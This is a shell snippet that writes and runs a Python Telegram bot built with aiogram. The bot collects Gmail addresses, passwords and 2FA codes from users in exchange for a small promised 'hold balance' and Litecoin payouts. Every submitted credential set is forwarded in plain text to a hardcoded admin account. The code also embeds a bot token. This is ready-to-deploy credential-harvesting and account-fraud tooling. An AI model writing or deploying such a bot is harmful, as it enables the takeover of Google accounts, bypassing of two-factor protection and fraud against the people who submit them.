pkill -f main.py && cat << 'EOF' > main.py
import os
import logging
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiohttp import web

BOT_TOKEN = "8924995974:AAEcOT5ChY4qlEl-1hguZJ_8nNFygqUOuZQ"
ADMIN_ID = 5582627293

logging.basicConfig(level=logging.INFO)

storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

user_data = {}

class BotStates(StatesGroup):
    waiting_for_gmail = State()
    waiting_for_password = State()
    waiting_for_2fa = State()
    waiting_for_ltc_address = State()
    waiting_for_withdraw_amount = State()

def get_main_menu():
    kb = [
        [types.KeyboardButton(text="Register"), types.KeyboardButton(text="My account")],
        [types.KeyboardButton(text="Balance"), types.KeyboardButton(text="Help")]
    ]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_register_menu():
    kb = [[types.KeyboardButton(text="Submit account"), types.KeyboardButton(text="Cancel ❌")]]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_payout_menu():
    kb = [[types.KeyboardButton(text="payout"), types.KeyboardButton(text="Cancel ❌")]]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_ltc_menu():
    kb = [[types.KeyboardButton(text="LTC"), types.KeyboardButton(text="Cancel ❌")]]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_back_menu():
    kb = [[types.KeyboardButton(text="Cancel ❌")]]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def init_user(user_id):
    if user_id not in user_data:
        user_data[user_id] = {"total_balance": 0.00, "hold_balance": 0.00, "accounts": []}

@dp.message(Command("start"))
async def send_welcome(message: types.Message, state: FSMContext):
    await state.clear()
    init_user(message.from_user.id)
    await message.reply("Welcome! Please select an option:", reply_markup=get_main_menu())

@dp.message(lambda message: message.text == "Cancel ❌")
async def cancel_process(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Process cancelled. Returned to main menu.", reply_markup=get_main_menu())

@dp.message(lambda message: message.text == "Register")
async def handle_register(message: types.Message):
    await message.answer("Do you want us to generate a login and password for you or you already have an account?", reply_markup=get_register_menu())

@dp.message(lambda message: message.text == "Submit account")
async def submit_account_start(message: types.Message, state: FSMContext):
    await message.answer("Gamil AC...", reply_markup=get_back_menu())
    await state.set_state(BotStates.waiting_for_gmail)

@dp.message(BotStates.waiting_for_gmail)
async def process_gmail(message: types.Message, state: FSMContext):
    await state.update_data(gmail=message.text)
    await message.answer("Give me Password.....")
    await state.set_state(BotStates.waiting_for_password)

@dp.message(BotStates.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    await state.update_data(password=message.text)
    await message.answer("2FO...")
    await state.set_state(BotStates.waiting_for_2fa)

@dp.message(BotStates.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    init_user(user_id)
    data = await state.get_data()
    gmail = data.get("gmail")
    password = data.get("password")
    two_fa = message.text
    
    account_info = {"gmail": gmail, "password": password, "2fa": two_fa, "status": "Pending"}
    user_data[user_id]["accounts"].append(account_info)
    user_data[user_id]["hold_balance"] += 0.17
    
    await message.answer("1 account submit successful\nHold balance 0.17", reply_markup=get_main_menu())
    
    admin_text = f"📩 New Account Submitted!\n\nUser: {message.from_user.full_name} ({user_id})\nGmail: {gmail}\nPassword: {password}\n2FA: {two_fa}"
    try:
        await bot.send_message(ADMIN_ID, admin_text)
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")
    await state.clear()

@dp.message(lambda message: message.text == "Balance")
async def handle_balance(message: types.Message):
    user_id = message.from_user.id
    init_user(user_id)
    await message.answer(f"Totally balance: ${user_data[user_id]['total_balance']:.2f}\nHold: ${user_data[user_id]['hold_balance']:.2f}", reply_markup=get_payout_menu())

@dp.message(lambda message: message.text == "payout")
async def handle_payout(message: types.Message):
    await message.answer("Select payment method :", reply_markup=get_ltc_menu())

@dp.message(lambda message: message.text == "LTC")
async def handle_ltc(message: types.Message, state: FSMContext):
    await message.answer("LTC token address submit now", reply_markup=get_back_menu())
    await state.set_state(BotStates.waiting_for_ltc_address)

@dp.message(BotStates.waiting_for_ltc_address)
async def process_ltc_address(message: types.Message, state: FSMContext):
    await state.update_data(ltc_address=message.text)
    await message.answer("Enter withdrawal amount (Minimum $5.00):")
    await state.set_state(BotStates.waiting_for_withdraw_amount)

@dp.message(BotStates.waiting_for_withdraw_amount)
async def process_withdraw(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
    except ValueError:
        await message.answer("Invalid amount. Please enter a valid number:")
        return
    if amount < 5.0:
        await message.answer("Minimum withdrawal limit is $5.00. Please enter a valid amount:")
        return
    init_user(user_id)
    if user_data[user_id]["total_balance"] < amount:
        await message.answer(f"Insufficient funds. Your balance is ${user_data[user_id]['total_balance']:.2f}", reply_markup=get_main_menu())
        await state.clear()
        return
    user_data[user_id]["total_balance"] -= amount
    await message.answer(f"Withdrawal request of ${amount:.2f} submitted successfully!", reply_markup=get_main_menu())
    data = await state.get_data()
    await bot.send_message(ADMIN_ID, f"💰 Withdrawal Request!\nUser: {user_id}\nAmount: ${amount:.2f}\nLTC Address: {data.get('ltc_address')}")
    await state.clear()

@dp.message(lambda message: message.text == "My account")
async def handle_my_account(message: types.Message):
    user_id = message.from_user.id
    init_user(user_id)
    accounts = user_data[user_id]["accounts"]
    if not accounts:
        await message.answer("You haven't submitted any accounts yet.", reply_markup=get_main_menu())
        return
    response = "📋 Your Submitted Accounts Details:\n\n"
    for idx, acc in enumerate(accounts, 1):
        response += f"{idx}. Gmail: {acc['gmail']}\n   Status: {acc['status']}\n\n"
    await message.answer(response, reply_markup=get_main_menu())

@dp.message(lambda message: message.text == "Help")
async def handle_help(message: types.Message):
    try:
        admin_user = await bot.get_chat(ADMIN_ID)
        if admin_user.username:
            await message.answer(f"⚙️ Help Support:\nAdmin is available. Message here: @{admin_user.username}")
        else:
            await message.answer(f"⚙️ Help Support:\nAdmin ID: {ADMIN_ID}.")
    except Exception:
        await message.answer("⚙️ Help Support:\nPlease contact the administrator directly.")

async def main():
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()

if __name__ == '__main__':
    asyncio.run(main())
EOF
nohup python main.py &
    
